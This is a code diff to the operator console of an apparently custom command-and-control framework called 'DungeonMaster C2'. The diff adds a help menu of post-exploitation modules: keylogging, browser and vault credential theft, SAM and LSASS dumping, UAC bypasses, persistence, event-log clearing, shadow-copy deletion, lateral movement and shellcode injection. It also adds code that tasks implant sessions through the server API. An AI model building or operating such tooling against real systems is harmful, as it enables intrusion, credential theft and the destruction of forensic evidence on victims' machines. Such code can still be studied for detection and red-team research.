@@ -9,6 +9,55 @@ interface Props {
   campaignId?: string
 }
 
+const HELP_LINES = [
+  '\x1b[36mModule commands  (!type method [key=value ...])\x1b[0m',
+  '',
+  '\x1b[33menum\x1b[0m     processes | users | groups | localadmins | shares | sessions | routes | netdiscovery | tasks | domain | services',
+  '\x1b[33mcollect\x1b[0m  clipboard | file-search path="C:\\\\..." ext=".docx" | screen-record [count=1] | keylog-start | keylog-dump | keylog-stop | wifi | vault | browser-creds | browser-history | dpapi',
+  '\x1b[33mpriv\x1b[0m     sam-dump | token-steal [pid=N] | token-make | uac-fodhelper cmd="..." | uac-eventvwr cmd="..." | pipe-impersonate',
+  '\x1b[33mpersist\x1b[0m  reg key="..." val="..." | task name="..." cmd="..." | svc name="..." | startup | com | wmi | reg-rm key="..." | svc-rm name="..."',
+  '\x1b[33mantifor\x1b[0m  timestomp path="..." modified="2020-01-01 00:00:00" | eventlog-clear log="Security" | eventlog-del log="..." id=N | indicator-rm path="..." | shadow-delete',
+  '\x1b[33mlateral\x1b[0m  smb-psexec host="..." cmd="..." | wmi host="..." cmd="..." | winrm host="..." cmd="..." | dcom host="..." cmd="..."',
+  '\x1b[33mcred\x1b[0m     lsass',
+  '\x1b[33minject\x1b[0m   classic pid=N shellcode="<b64>" | apc pid=N shellcode="<b64>" | hollow exe="..." shellcode="<b64>" | hijack pid=N shellcode="<b64>" | stomp pid=N dll="..." shellcode="<b64>"',
+  '',
+  'Shell:   type any command without ! prefix (runs via cmd /C)',
+]
+
+function parseModuleArgs(tokens: string[]): Record<string, unknown> {
+  const args: Record<string, unknown> = {}
+  for (const tok of tokens) {
+    const eq = tok.indexOf('=')
+    if (eq === -1) continue
+    const key = tok.slice(0, eq)
+    const val = tok.slice(eq + 1)
+    const num = Number(val)
+    args[key] = val !== '' && !isNaN(num) ? num : val
+  }
+  return args
+}
+
+function tokenize(line: string): string[] {
+  const tokens: string[] = []
+  let cur = ''
+  let inQ = false
+  let qch = ''
+  for (const ch of line) {
+    if (inQ) {
+      if (ch === qch) inQ = false
+      else cur += ch
+    } else if (ch === '"' || ch === "'") {
+      inQ = true; qch = ch
+    } else if (ch === ' ' || ch === '\t') {
+      if (cur) { tokens.push(cur); cur = '' }
+    } else {
+      cur += ch
+    }
+  }
+  if (cur) tokens.push(cur)
+  return tokens
+}
+
 export function SessionConsole({ sessionId, campaignId: _campaignId }: Props) {
   const containerRef = useRef<HTMLDivElement>(null)
   const termRef      = useRef<HTMLDivElement>(null)
@@ -62,6 +111,7 @@ export function SessionConsole({ sessionId, campaignId: _campaignId }: Props) {
 
     t.writeln('\x1b[36mDungeonMaster C2 — Interactive Shell\x1b[0m')
     t.writeln(`\x1b[90mSession: ${sessionId}\x1b[0m`)
+    t.writeln('\x1b[90mShell commands run directly. Prefix with ! for module tasks (!help for list).\x1b[0m')
     t.writeln('')
 
     const obs = new ResizeObserver(() => requestAnimationFrame(() => fa.fit()))
@@ -76,6 +126,44 @@ export function SessionConsole({ sessionId, campaignId: _campaignId }: Props) {
   async function sendCommand(cmd: string) {
     if (!cmd.trim() || busy) return
     setBusy(true)
+
+    if (cmd.startsWith('!')) {
+      const line = cmd.slice(1).trim()
+
+      if (line === 'help' || line === '') {
+        HELP_LINES.forEach(l => term.current?.writeln(l))
+        setBusy(false)
+        return
+      }
+
+      const tokens = tokenize(line)
+      const type   = tokens[0]
+      const method = tokens[1]
+
+      if (!method) {
+        term.current?.writeln('\x1b[31musage: !<type> <method> [key=value ...]\x1b[0m')
+        setBusy(false)
+        return
+      }
+
+      const args = { method, ...parseModuleArgs(tokens.slice(2)) }
+      term.current?.writeln(`\x1b[35m[${type}/${method}]\x1b[0m`)
+
+      try {
+        const { data } = await api.post('/api/v1/tasks', {
+          session_id: sessionId,
+          type,
+          args: btoa(JSON.stringify(args)),
+        })
+        await pollTaskOutput(data.task_id)
+      } catch (err: unknown) {
+        term.current?.writeln(`\x1b[31mError: ${(err as Error).message}\x1b[0m`)
+      } finally {
+        setBusy(false)
+      }
+      return
+    }
+
     term.current?.writeln(`\x1b[33m$ ${cmd}\x1b[0m`)
     try {
       const { data } = await api.post('/api/v1/tasks', {
@@ -140,7 +228,7 @@ export function SessionConsole({ sessionId, campaignId: _campaignId }: Props) {
           onChange={e => setInput(e.target.value)}
           onKeyDown={handleKeyDown}
           disabled={busy}
-          placeholder={busy ? 'waiting for output...' : 'enter command'}
+          placeholder={busy ? 'waiting for output...' : 'command or !type method [key=val ...]'}
           autoComplete="off"
           spellCheck={false}
           style={{
